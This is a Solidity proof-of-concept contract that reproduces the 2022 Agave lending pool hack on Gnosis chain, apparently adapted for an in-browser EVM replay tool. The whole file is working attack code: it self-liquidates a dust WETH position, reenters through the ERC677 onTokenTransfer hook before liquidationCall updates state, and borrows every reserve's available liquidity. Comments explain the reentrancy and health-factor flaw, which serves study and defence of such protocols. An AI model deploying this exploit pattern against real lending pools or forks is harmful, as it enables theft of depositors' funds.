// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

interface IGnosisBridgedAsset is IERC20 {
    function mint(address, uint256) external returns (bool);
}

// @KeyInfo - Total Lost : ~1.5M US$
// Attacker : https://gnosisscan.io/address/0x0a16a85be44627c10cee75db06b169c7bc76de2c
// Attack Contract : https://gnosisscan.io/address/0xF98169301B06e906AF7f9b719204AA10D1F160d6
// Vulnerable Contract : https://gnosisscan.io/address/0x207E9def17B4bd1045F5Af2C651c081F9FDb0842 (Agave lending pool v1)
// Attack Tx : https://gnosisscan.io/tx/0xa262141abcf7c127b88b4042aee8bf601f4f3372c9471dbd75cb54e76524f18e
//
// Cheatcode-free synthetic reproduction for the in-browser EVM Playground
// (@ethereumjs/vm replay engine — zero Foundry cheatcode support).
//
// VULNERABILITY: Reentrancy via ERC677-style onTokenTransfer hook in liquidationCall
// (CEI violation in this Aave-v2 fork's liquidation path). See Agave_exp.md / the
// registry test/Agave_exp.sol header for the full write-up.
//
// The "prepare marginally-liquidatable position" phase (deposit/borrow/withdraw)
// and the vm.warp(+1h) that the original Foundry PoC uses to accrue interest are
// NOT executed by this contract — the replay engine holds one fixed block.timestamp
// for the whole run, so they are replicated by the poc-config's `setup.steps`
// (plain contract calls, no cheatcode) followed by a `storeSlot` rewind of the
// LendingPool's per-reserve `lastUpdateTimestamp` (see 2022-03-Agave.mjs). This
// contract only performs the actual attack: self-liquidate, let the hook fire,
// reenter to borrow every reserve's liquidity, withdraw, "repay".
contract AgaveExploit {
    address aweth = 0xb5A165d9177555418796638447396377Edf4C18a;
    address gno = 0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb;
    address weth = 0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1;
    address link = 0xE2e73A1c69ecF83F464EFCE6A5be353a37cA09b2;
    address wbtc = 0x8e5bBbb09Ed1ebdE8674Cda39A0c169401db4252;
    address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
    address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;

    // Array of assets to drain via reentrant borrow (WETH handled separately in
    // boostLTVHack because it needs the flash-funded deposit boost first).
    address[] assetAddrs;

    address provider = 0xA91B9095eFa6C0568467562032202108e49c9Ef8;

    IGnosisBridgedAsset WETH = IGnosisBridgedAsset(weth);
    IGnosisBridgedAsset LINK = IGnosisBridgedAsset(link);

    ILendingPool lendingPool;

    uint256 callCount = 0;
    uint256 wethLiqBeforeHack;

    // Simulated flashloan amount (matches the original PoC's `2728.934387414251504146 ether + 1`),
    // minted to this contract by the Gnosis bridge owner in setup.steps.
    uint256 ethFlashloanAmt = 2728934387414251504147;

    constructor() {
        lendingPool = ILendingPool(ILendingPoolAddressesProvider(provider).getLendingPool());

        assetAddrs = new address[](5);
        assetAddrs[0] = usdc;
        assetAddrs[1] = gno;
        assetAddrs[2] = link;
        assetAddrs[3] = wbtc;
        assetAddrs[4] = wxdai;

        // Approve the pool for the tokens `setup.steps` will mint to this contract.
        // Plain contract calls — no cheatcode needed since `approve` just needs
        // `msg.sender == address(this)`.
        LINK.approve(address(lendingPool), type(uint256).max);
        WETH.approve(address(lendingPool), type(uint256).max);
    }

    // VULNERABILITY: LiquidationCall external call (pre-state-update transfer) is the trigger point.
    // The vulnerable ILendingPool executes the collateral aToken transfer (value=1) to this
    // contract *before* any Effects (debt burn, HF recalc, liquidity index update). The aToken
    // is an ERC677-style bridged asset: any positive-value transfer invokes onTokenTransfer on a
    // contract recipient, and the call stack is still inside liquidationCall when that happens.
    function testExploit() external {
        wethLiqBeforeHack = _getAvailableLiquidity(weth);

        // Self-liquidate a dust amount (2 wei) of WETH debt against WETH collateral.
        // debtToCover is irrelevant; the collateral-transfer side effect (the hook) is
        // what matters. Permissionless because the position's health factor was pushed
        // below 1 by the `storeSlot` interest-accrual simulation in setup.
        lendingPool.liquidationCall(weth, weth, address(this), 2, false);

        // Reentrancy (below, via onTokenTransfer) has already drained every reserve's
        // available liquidity by the time liquidationCall returns here.
        lendingPool.withdraw(weth, _getTokenBal(aweth), address(this));

        // "Repay" the simulated flashloan (send back principal + fee) — mirrors the
        // original PoC forwarding funds to close out the flash-loan simulation.
        WETH.transfer(address(1), ((ethFlashloanAmt * 1000) / 997) + 1);
    }

    function _getTokenBal(address asset) internal view returns (uint256) {
        return IERC20(asset).balanceOf(address(this));
    }

    function _getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        reserveTokenbal = IERC20(asset).balanceOf(data.aTokenAddress);
    }

    function _borrow(address asset) internal {
        // During reentrancy this reads the *still-full* liquidity because
        // liquidationCall has not yet written the updated aToken balance / reserve
        // data for the WETH collateral it is seizing.
        uint256 reserveTokenbal = _getAvailableLiquidity(asset);
        uint256 borrowAmount = reserveTokenbal > 2 ? reserveTokenbal - 1 : 0;
        if (borrowAmount > 0) lendingPool.borrow(asset, borrowAmount, 2, 0, address(this));
    }

    // VULNERABILITY: Temporary HF boost inside the reentrancy window.
    // deposit(flash-1) uses the flash-loaned WETH that was never deposited in the
    // outer context; it only exists to satisfy the pool's HF check for the massive
    // WETH borrow that follows. Borrow checks are performed against the
    // *pre-liquidation* user account data and reserve state; the inner deposit
    // temporarily makes the numbers pass.
    function borrowTokens() internal {
        lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);

        // Borrow all non-WETH reserves' available liquidity.
        for (uint256 i = 0; i < assetAddrs.length; i++) {
            _borrow(assetAddrs[i]);
        }

        // Borrow WETH directly (an edge case in the underlying pool makes the
        // generic _borrow() path fail for WETH specifically).
        lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
    }

    // VULNERABILITY: Reentrancy via ERC677 onTokenTransfer hook in liquidationCall (CEI violation).
    // The aWETH collateral transfer inside liquidationCall fires this hook *before* the
    // liquidation's own debt-burn/accounting Effects run. No reentrancy guard protects
    // liquidationCall or the borrow path, so the reentrant borrowTokens() call below sees
    // pre-liquidation liquidity and health-factor data for every reserve.
    function onTokenTransfer(address _from, uint256 _value, bytes memory) external {
        if (_from == aweth && _value == 1) {
            callCount++;
            if (callCount == 2) {
                borrowTokens();
            }
        }
    }
}
